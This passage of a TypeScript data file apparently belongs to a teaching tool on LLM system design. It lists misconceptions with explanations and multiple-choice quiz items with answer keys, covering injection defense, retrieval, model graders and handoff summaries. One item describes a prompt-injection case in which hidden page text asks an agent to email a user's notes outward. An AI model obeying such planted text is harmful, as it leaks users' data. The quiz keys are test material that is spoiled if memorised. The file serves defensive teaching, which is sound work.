    corrective: { id: 'mc-tell-it-to-ignore-injection', kind: 'single', concept: 'prompt-injection-defense', prompt: 'A research agent summarises web pages and can also send email. A page contains hidden text asking it to email the user\'s notes to an outside address. Which design best limits the damage?', options: [o('a', 'Remove the email capability from this agent (least privilege) and keep a human approval step for any outbound message', 'Correct: even if an injection works, there is nothing dangerous it can reach.'), o('b', 'Add a stronger line to the system prompt telling it never to follow page instructions', 'Helpful, but it is the only barrier: one successful phrasing still sends the email.', 'tell-it-to-ignore-injection'), o('c', 'Trust the model because it is generally resistant to injection', 'Resistant is not immune, and the consequence here is data leaving the machine.', 'tell-it-to-ignore-injection'), o('d', 'Only read pages from popular sites', 'Popular sites can still carry user-generated or compromised content.')], correct: 'a', explanation: 'Bound the damage structurally; instructions are one layer.' },
  },
  {
    id: 'retrieved-means-true',
    competency: 'retrieval-design',
    belief: 'If the system retrieved a passage and the model cites it, the answer is grounded and correct.',
    whyPlausible: 'A citation looks like proof, and retrieval is often introduced precisely to reduce hallucination.',
    whyWrong: 'Retrieval returns what scored as similar, not what is true. The passage can be stale, superseded, about a different product or version, contradicted by another passage, or simply irrelevant but lexically close. A citation shows where text came from, not that it is current or applicable.',
    contrast: { wrong: '"It cited the 2023 guide, so the answer is right."', right: '"It cited a guide, I checked its date and version against the question, and a newer note contradicts it, so I use the newer one and flag the conflict."', note: 'Attribution is not validation.' },
    corrective: { id: 'mc-retrieved-means-true', kind: 'single', concept: 'retrieval-design', prompt: 'Two retrieved snippets answer a question about a tool\'s timeout default: one from a 2022 changelog says 30 s, one from a 2026 reference page says 60 s. What is the sound handling?', options: [o('a', 'Prefer the newer authoritative source for the current version, state the conflict, and note the older value was superseded', 'Correct: recency and authority matter, and the conflict should be visible.'), o('b', 'Use whichever snippet scored higher in retrieval', 'Relevance score measures similarity to the query, not currency or correctness.', 'retrieved-means-true'), o('c', 'Average the two values', 'That invents a value that no source states.', 'retrieved-means-true'), o('d', 'Use the first snippet because it came first', 'Order is an artefact of ranking, not of correctness.', 'retrieved-means-true')], correct: 'a', explanation: 'Check date, authority and agreement before trusting a snippet.' },
  },
  {
    id: 'judge-model-is-ground-truth',
    competency: 'eval-harness-design',
    belief: 'If a strong model grades my outputs, the scores are ground truth.',
    whyPlausible: 'Model graders scale well, are consistent in tone, and often agree with people on easy cases.',
    whyWrong: 'A model grader is another fallible measurement with its own biases (verbosity, position, self-preference). Use deterministic graders where an answer can be checked mechanically, calibrate any model grader against human-labelled cases, prefer a different model from the generator, and report it as a model-graded measure.',
    contrast: { wrong: '"The judge gave 9/10, so the new prompt is 20% better."', right: '"Tests passed 14/20 versus 11/20 (deterministic); the model grader agreed with my labels on 17 of 20 audited cases, so I treat its scores as directional."', note: 'Check the grader before trusting the grade.' },
    corrective: { id: 'mc-judge-model-is-ground-truth', kind: 'single', concept: 'eval-harness-design', prompt: 'You grade code-fix outputs with a language model. A unit-test suite also exists. Which gives the stronger evidence that a fix works?', options: [o('a', 'The unit-test results, with the model grader used only for qualities tests cannot check, after you have audited it against human labels', 'Correct: a deterministic check is stronger where it exists, and a model grader needs its own audit.'), o('b', 'The model grader, because it reads the whole diff', 'Reading a diff is not running it; the grader can be confidently wrong.', 'judge-model-is-ground-truth'), o('c', 'Whichever score is higher', 'Choosing the favourable measure after the fact biases the comparison.', 'judge-model-is-ground-truth'), o('d', 'Neither; only human review counts', 'Human review is valuable but slow; deterministic tests are cheap evidence that should not be discarded.')], correct: 'a', explanation: 'Prefer deterministic graders; audit model graders.' },
  },
  {
    id: 'summary-is-safe-memory',
    competency: 'long-running-context',
    belief: 'A summary of the earlier session is as good as the earlier session, so I can carry it forward unchecked.',
    whyPlausible: 'Summaries are shorter and feel like the same information, and compression is how long tasks stay within limits.',
    whyWrong: 'A summary is a lossy, authored claim. It can drop a constraint, keep a stale assumption, or state "tests pass" when the check never ran. After an interruption, durable facts (instructions, the task list, the repository state) should be re-read from their source, and claims that matter revalidated before work builds on them.',
    contrast: { wrong: '"The handoff note says the migration is done and tests pass, so start the next step."', right: '"The note says so; I will run the migration status and the test command before building on it, and record the result."', note: 'Preserve facts, revalidate claims.' },
    corrective: { id: 'mc-summary-is-safe-memory', kind: 'single', concept: 'long-running-context', prompt: 'A new session starts from a handoff note that says "feature 3 complete, all tests passing". What should happen first?', options: [o('a', 'Run the tests and check the repository state to confirm the claim, then continue', 'Correct: the note is a claim; the repository and a real test run are the evidence.'), o('b', 'Trust the note and start feature 4 immediately', 'If the note was wrong, feature 4 will be built on a broken base.', 'summary-is-safe-memory'), o('c', 'Delete the note and start over from scratch', 'Discarding durable progress wastes work; the right move is to verify it.'), o('d', 'Ask the previous session to confirm', 'A previous session cannot confirm the present repository state; running the checks can.', 'summary-is-safe-memory')], correct: 'a', explanation: 'Revalidate claims that later work depends on.' },
  },
];

export const MISCONCEPTIONS: Record<string, Misconception> = Object.fromEntries(MISCONCEPTIONS_LIST.map((m) => [m.id, m]));
export const MISCONCEPTION_IDS = MISCONCEPTIONS_LIST.map((m) => m.id);

export function getMisconception(id: string | undefined): Misconception | undefined {
  return id ? MISCONCEPTIONS[id] : undefined;
}
